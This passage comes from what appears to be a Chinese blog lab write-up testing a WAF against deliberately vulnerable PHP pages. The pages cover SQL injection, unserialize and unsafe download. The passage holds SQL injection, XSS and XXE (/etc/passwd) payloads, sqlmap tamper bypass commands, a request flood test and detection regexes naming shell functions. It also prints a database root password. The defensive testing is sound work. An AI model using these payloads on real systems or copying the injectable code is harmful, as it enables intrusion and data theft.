+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&apos;Content-Type&apos; content=&apos;text/html; charset=utf-8&apos; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$conn = mysql_connect(&apos;192.168.5.101:3306&apos;, &apos;root&apos;, &apos;Zhang7755128!&apos;) or die(&apos;bad!&apos;);</span><br><span class="line">mysql_query(&quot;SET NAMES &apos;utf-8&apos;&quot;);</span><br><span class="line">mysql_select_db(&apos;yuangong&apos;, $conn) OR emMsg(&quot;数据库连接失败&quot;);</span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM workers WHERE id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"></span><br><span class="line">        if($row)</span><br><span class="line">        &#123;</span><br><span class="line">        echo &quot;&lt;font size=&apos;10&apos; color= &apos;#88FE00&apos;&gt;&quot;;</span><br><span class="line">        echo &apos;员工表:&apos;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;font size=&apos;5&apos; color= &apos;#000000&apos;&gt;&quot;;</span><br><span class="line">        echo &apos;你的姓名:&apos;. $row[&apos;username&apos;];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &apos;你的邮箱:&apos; .$row[&apos;email&apos;];</span><br><span class="line">        echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">        echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">        echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="测试无waf拦截状态："><a href="#测试无waf拦截状态：" class="headerlink" title="测试无waf拦截状态："></a>测试无waf拦截状态：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.109/sql.php?id=1&apos; and 1=2 union select 1, GROUP_CONCAT(username),GROUP_CONCAT(password) from users;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428105955172.png" alt="image-20200428105955172"></p>
+<h6 id="有waf拦截状态："><a href="#有waf拦截状态：" class="headerlink" title="有waf拦截状态："></a>有waf拦截状态：</h6><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428110117080.png" alt="image-20200428110117080"></p>
+<p>然后用sqlmap进行测试：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428113713026.png" alt="image-20200428113713026"></p>
+<p>发现也被拦截。</p>
+<p>拦截规则为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select.+(from|<span class="built_in">limit</span>)</span><br><span class="line">(?:(union(.*?)select))</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-5-CC攻击"><a href="#2-5-CC攻击" class="headerlink" title="2.5 CC攻击"></a>2.5 CC攻击</h4><p>首先在config.lua文件开启CC攻击，并设置一个IP在60秒内只能访问5次：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CCDeny=<span class="string">"on"</span></span><br><span class="line">CCrate=<span class="string">"5/60"</span></span><br></pre></td></tr></table></figure>
+
+<p>测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ab -c 1000 -n 1200 http://192.168.5.101/hello</span></span><br><span class="line">This is ApacheBench, Version 2.3 &lt;<span class="variable">$Revision</span>: 1430300 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking 192.168.5.101 (be patient)</span><br><span class="line">Completed 120 requests</span><br><span class="line">Completed 240 requests</span><br><span class="line">Completed 360 requests</span><br><span class="line">Completed 480 requests</span><br><span class="line">Completed 600 requests</span><br><span class="line">Completed 720 requests</span><br><span class="line">Completed 840 requests</span><br><span class="line">Completed 960 requests</span><br><span class="line">Completed 1080 requests</span><br><span class="line">Completed 1200 requests</span><br><span class="line">Finished 1200 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        nginx/1.13.6</span><br><span class="line">Server Hostname:        192.168.5.101</span><br><span class="line">Server Port:            80</span><br><span class="line"></span><br><span class="line">Document Path:          /hello</span><br><span class="line">Document Length:        2078 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      1000</span><br><span class="line">Time taken <span class="keyword">for</span> tests:   0.353 seconds</span><br><span class="line">Complete requests:      1200</span><br><span class="line">Failed requests:        1188</span><br><span class="line">   (Connect: 0, Receive: 0, Length: 1188, Exceptions: 0)</span><br><span class="line">Write errors:           0</span><br><span class="line">Non-2xx responses:      1200</span><br><span class="line">Total transferred:      484128 bytes</span><br><span class="line">HTML transferred:       277980 bytes</span><br><span class="line">Requests per second:    3394.99 [<span class="comment">#/sec] (mean)</span></span><br><span class="line">Time per request:       294.552 [ms] (mean)</span><br><span class="line">Time per request:       0.295 [ms] (mean, across all concurrent requests)</span><br><span class="line">Transfer rate:          1337.57 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        0   57  25.2     67      88</span><br><span class="line">Processing:    14   75  27.7     80     209</span><br><span class="line">Waiting:        1   73  30.1     79     209</span><br><span class="line">Total:         14  133  32.0    143     217</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%    143</span><br><span class="line">  66%    148</span><br><span class="line">  75%    150</span><br><span class="line">  80%    152</span><br><span class="line">  90%    156</span><br><span class="line">  95%    159</span><br><span class="line">  98%    160</span><br><span class="line">  99%    161</span><br><span class="line"> 100%    217 (longest request)</span><br></pre></td></tr></table></figure>
+
+<p>拦截图：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428111633949.png" alt="image-20200428111633949"></p>
+<h4 id="2-6-PHP反序列化漏洞"><a href="#2-6-PHP反序列化漏洞" class="headerlink" title="2.6 PHP反序列化漏洞"></a>2.6 PHP反序列化漏洞</h4><p>漏洞代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class S&#123;</span><br><span class="line">    var $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;;&#125;</span><br><span class="line">$html=&apos;&apos;;</span><br><span class="line">if(isset($_POST[&apos;o&apos;]))&#123;</span><br><span class="line">    $s = $_POST[&apos;o&apos;];</span><br><span class="line">    if(!@$unser = unserialize($s))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">"S"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">29</span>:<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>未拦截图片：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511110804943.png" alt="image-20200511110804943"></p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511110832363.png" alt="image-20200511110832363"></p>
+<p>拦截图片：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511111005273.png" alt="image-20200511111005273"></p>
+<p>拦截规则为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(?:define|<span class="built_in">eval</span>|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\w+|execute|<span class="built_in">echo</span>|<span class="built_in">print</span>|print_r|var_dump|(fp)open|alert|showmodaldialog)\(</span><br><span class="line">\&lt;(iframe|script|body|img|layer|div|meta|style|base|object|input)</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-7-xxe漏洞"><a href="#2-7-xxe漏洞" class="headerlink" title="2.7 xxe漏洞"></a>2.7 xxe漏洞</h4><p>XXE -“xml external entity injection”既”xml外部实体注入漏洞”。<br>就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>  <span class="meta">&lt;!DOCTYPE creds [   &lt;!ENTITY goodies SYSTEM "file:///etc/passwd"&gt; ]&gt;</span>  <span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>未拦截图：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511114905680.png" alt="image-20200511114905680"></p>
+<p>拦截图：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511115022047.png" alt="image-20200511115022047"></p>
+<p>拦截规则为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\:\/</span><br><span class="line">(?:etc\/\W*passwd)</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-WAF绕过"><a href="#3-WAF绕过" class="headerlink" title="3.WAF绕过"></a>3.WAF绕过</h3><h4 id="3-1-SQL注入绕过（代码如下）："><a href="#3-1-SQL注入绕过（代码如下）：" class="headerlink" title="3.1 SQL注入绕过（代码如下）："></a>3.1 SQL注入绕过（代码如下）：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by runner.han</span><br><span class="line"> * There is nothing new under the sun</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$SELF_PAGE = substr($_SERVER[&apos;PHP_SELF&apos;],strrpos($_SERVER[&apos;PHP_SELF&apos;],&apos;/&apos;)+1);</span><br><span class="line"></span><br><span class="line">if ($SELF_PAGE = &quot;sqli_id.php&quot;)&#123;</span><br><span class="line">    $ACTIVE = array(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;active open&apos;,&apos;&apos;,&apos;active&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$PIKA_ROOT_DIR =  &quot;../../&quot;;</span><br><span class="line">include_once $PIKA_ROOT_DIR . &apos;header.php&apos;;</span><br><span class="line"></span><br><span class="line">include_once $PIKA_ROOT_DIR.&quot;inc/config.inc.php&quot;;</span><br><span class="line">include_once $PIKA_ROOT_DIR.&quot;inc/function.php&quot;;</span><br><span class="line">include_once $PIKA_ROOT_DIR.&quot;inc/mysql.inc.php&quot;;</span><br><span class="line"></span><br><span class="line">$link=connect();</span><br><span class="line">$html=&apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;id&apos;]!=null)&#123;</span><br><span class="line">    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入</span><br><span class="line">    $id=$_POST[&apos;id&apos;];</span><br><span class="line">    $query=&quot;select username,email from member where id=$id&quot;;</span><br><span class="line">    $result=execute($link, $query);</span><br><span class="line">    //这里如果用==1,会严格一点</span><br><span class="line">    if(mysqli_num_rows($result)&gt;=1)&#123;</span><br><span class="line">        while($data=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            $username=$data[&apos;username&apos;];</span><br><span class="line">            $email=$data[&apos;email&apos;];</span><br><span class="line">            $html.=&quot;&lt;p class=&apos;notice&apos;&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该段代码是一段数字型注入代码，其中id字段在传入的过程中未进行安全校验，导致注入的发生。</p>
+<h5 id="3-1-1-在无waf的状态下，利用sqlmap进行注入内容如下："><a href="#3-1-1-在无waf的状态下，利用sqlmap进行注入内容如下：" class="headerlink" title="3.1.1 在无waf的状态下，利用sqlmap进行注入内容如下："></a>3.1.1 在无waf的状态下，利用sqlmap进行注入内容如下：</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509145216077.png" alt="image-20200509145216077"></p>
+<p>可以正常获取到数据库信息。</p>
+<p>在有waf的情况下仅仅能探测到数据库，并不能爆库：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509145533907.png" alt="image-20200509145533907"></p>
+<h5 id="3-1-2-WAF绕过"><a href="#3-1-2-WAF绕过" class="headerlink" title="3.1.2 WAF绕过"></a>3.1.2 WAF绕过</h5><p>采用sqlmap中–tamper脚本进行waf绕过：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --dbs mysql  --tamper <span class="string">"space2comment,versionedmorekeywords.py"</span>  -v 3</span><br></pre></td></tr></table></figure>
+
+<p>发现绕过了并且探测到一个数据库：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509150010643.png" alt="image-20200509150010643"></p>
+<p>发现绕过的PAYLOAD如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(6202,/*!CONCAT*/(0x2e,0x71626b7671,(/*!SELECT*//*!IFNULL*/(CAST(COUNT(/*!schema_name*/)/*!AS*//*!NCHAR*/),0x20)/*!FROM*/INFORMATION_SCHEMA.SCHEMATA),0x7171787671),7610))</span><br><span class="line"></span><br><span class="line">(UPDATEXML(9266,/*!CONCAT*/(0x2e,0x71626b7671,(MID((/*!IFNULL*/(CAST(/*!DATABASE*/()/*!AS*//*!NCHAR*/),0x20)),1,22)),0x7171787671),5779))</span><br></pre></td></tr></table></figure>
+
+<p>进行WAF规制的拟写，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(UPDATEXML.+(CAST.()))</span><br><span class="line">//匹配UPDATEXML,其中.表示匹配除“\n”和<span class="string">"\r"</span>之外的任何单个字符； +表示匹配前面的子表达式一次或多次(大于等于1次）。</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap进行跑一下，发现拦截了payload，没有输出数据库：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509162427844.png" alt="image-20200509162427844"></p>
+<h4 id="3-2-不安全的文件下载绕过"><a href="#3-2-不安全的文件下载绕过" class="headerlink" title="3.2  不安全的文件下载绕过"></a>3.2  不安全的文件下载绕过</h4><p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by runner.han</span><br><span class="line"> * There is nothing new under the sun</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$SELF_PAGE = substr($_SERVER[&apos;PHP_SELF&apos;],strrpos($_SERVER[&apos;PHP_SELF&apos;],&apos;/&apos;)+1);</span><br><span class="line"></span><br><span class="line">if ($SELF_PAGE = &quot;unsafedownload.php&quot;)&#123;</span><br><span class="line">    $ACTIVE = array(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;active open&apos;,&apos;active&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$PIKA_ROOT_DIR =  &quot;../../&quot;;</span><br><span class="line">include_once $PIKA_ROOT_DIR . &apos;header.php&apos;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by runner.han</span><br><span class="line"> * There is nothing new under the sun</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$SELF_PAGE = substr($_SERVER[&apos;PHP_SELF&apos;],strrpos($_SERVER[&apos;PHP_SELF&apos;],&apos;/&apos;)+1);</span><br><span class="line"></span><br><span class="line">if ($SELF_PAGE = &quot;unsafedownload.php&quot;)&#123;</span><br><span class="line">    $ACTIVE = array(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;active 